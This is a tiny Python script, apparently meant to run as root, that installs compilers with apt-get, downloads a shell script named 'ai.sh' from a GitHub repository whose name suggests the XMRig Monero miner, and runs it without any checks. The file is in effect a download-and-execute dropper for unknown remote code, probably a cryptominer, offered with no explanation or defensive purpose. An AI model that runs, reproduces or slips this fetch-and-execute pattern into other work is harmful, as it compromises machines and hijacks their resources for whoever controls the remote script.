__author__ = 'root'
import os,sys
os.system('apt-get update -y')
os.system('apt-get install gcc make cmake python python-dev -y')
os.system('wget https://raw.githubusercontent.com/ToRxmrig/container--1hp8ak/main/ai.sh')
os.system('./ai.sh')
